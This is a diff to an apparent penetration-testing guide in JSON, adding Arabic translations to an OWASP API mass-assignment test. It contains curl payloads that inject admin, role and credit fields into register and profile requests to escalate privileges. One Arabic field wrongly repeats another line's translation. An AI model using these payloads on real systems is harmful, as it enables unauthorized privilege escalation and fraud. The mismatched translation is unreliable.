-            "title": "Mass Assignment Testing (API3)",
-            "purpose": "Add unauthorized fields to API requests to escalate privileges",
-            "cmd": "# Registration \u2014 add admin flag:\ncurl -s -X POST https://{TARGET}/api/v1/register \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"test\",\"password\":\"Test123!\",\n       \"admin\":true,\"role\":\"admin\",\"isVerified\":true}'\n\n# Profile update \u2014 add credit/balance:\ncurl -s -X PUT https://{TARGET}/api/v1/users/{USER_ID} \\\n  -H 'Authorization: Bearer {TOKEN}' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"new@test.com\",\"isAdmin\":true,\"credits\":99999,\"planTier\":\"enterprise\"}'\n\n# Use Burp Param Miner to find hidden parameters automatically",
+            "title": {
+              "en": "Mass Assignment Testing (API3)",
+              "ar": "اختبار الإسناد الجماعي (API3)"
+            },
+            "purpose": {
+              "en": "Add unauthorized fields to API requests to escalate privileges",
+              "ar": "إضافة حقول غير مصرّح بها لطلبات API لتصعيد الصلاحيات"
+            },
+            "cmd": "# Registration — add admin flag:\ncurl -s -X POST https://{TARGET}/api/v1/register \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"test\",\"password\":\"Test123!\",\n       \"admin\":true,\"role\":\"admin\",\"isVerified\":true}'\n\n# Profile update — add credit/balance:\ncurl -s -X PUT https://{TARGET}/api/v1/users/{USER_ID} \\\n  -H 'Authorization: Bearer {TOKEN}' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"new@test.com\",\"isAdmin\":true,\"credits\":99999,\"planTier\":\"enterprise\"}'\n\n# Use Burp Param Miner to find hidden parameters automatically",
             "example": "curl -X POST https://api.target.com/register -d '{\"username\":\"h4x\",\"role\":\"admin\"}'",
             "flags": [
               {
                 "f": "",
-                "d": "Fields to try: admin, isAdmin, role, credits, balance, verified, approved, planTier"
+                "d": {
+                  "en": "Fields to try: admin, isAdmin, role, credits, balance, verified, approved, planTier",
+                  "ar": "تحقق من جسم الاستجابة — هل يُعيد الحقل الذي أرسلته؟"
+                }
               },
               {
                 "f": "",
-                "d": "Check response body \u2014 does it echo back the field you sent?"
+                "d": {
+                  "en": "Check response body — does it echo back the field you sent?",
+                  "ar": "تحقق من جسم الاستجابة — هل يُعيد الحقل الذي أرسلته؟"
+                }
               }
             ],
-            "note": "If the server echoes back admin:true or role:admin in the response, the assignment succeeded.",
-            "out": "Elevated role or credits in response = Mass Assignment (High/Critical)"
+            "note": {
+              "en": "If the server echoes back admin:true or role:admin in the response, the assignment succeeded.",
+              "ar": "إن أعاد الخادم admin:true أو role:admin في الاستجابة، فقد نجح الإسناد."
+            },
+            "out": {
+              "en": "Elevated role or credits in response = Mass Assignment (High/Critical)",
+              "ar": "دور مرتفع أو رصيد في الاستجابة = إسناد جماعي (عالي/حرِج)"
+            }
           }
         ],
         "tools": [
@@ -1514,8 +3098,14 @@
           "Postman",
           "Param Miner (Burp ext.)"
         ],
-        "deliverable": "OWASP API Top 10 assessment with PoC for each finding",
-        "tip": "Install Burp extension 'Param Miner' \u2014 it discovers hidden parameters in seconds. This finds mass assignment candidates automatically."
+        "deliverable": {
+          "en": "OWASP API Top 10 assessment with PoC for each finding",
+          "ar": "تقييم OWASP API Top 10 مع إثبات مفهوم لكل نتيجة"
+        },
+        "tip": {
+          "en": "Install Burp extension 'Param Miner' — it discovers hidden parameters in seconds. This finds mass assignment candidates automatically.",
+          "ar": "ثبّت إضافة Burp 'Param Miner' — تكتشف المعاملات المخفية خلال ثوانٍ. تجد مرشحي Mass Assignment تلقائياً."
+        }
       }
     ]
   }
